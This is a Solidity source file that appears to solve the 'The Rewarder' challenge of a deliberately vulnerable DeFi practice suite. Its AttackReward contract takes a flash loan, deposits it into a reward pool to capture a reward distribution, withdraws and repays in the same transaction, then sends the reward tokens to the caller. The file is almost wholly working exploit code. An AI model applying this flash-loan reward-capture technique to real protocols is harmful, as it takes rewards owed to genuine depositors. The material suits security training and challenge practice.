pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

import "../DamnValuableToken.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);

    function isNewRewardsRound() external view returns (bool);
}

/**
 * @notice A mintable ERC20 token to issue rewards
 */
contract RewardToken is ERC20, AccessControl {

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor() public ERC20("Reward Token", "RWT") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external {
        require(hasRole(MINTER_ROLE, msg.sender));
        _mint(to, amount);
    }
}

contract AttackReward {
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    IFlashLoanerPool public flashLoanerPool;
    ITheRewarderPool public theRewarderPool;

    constructor(address liquidityTokenAddress, address rewardTokenAddress, IFlashLoanerPool _flashLoanerPool, ITheRewarderPool _theRewarderPool) public {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
    }

    function attack(uint256 amount) public {
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}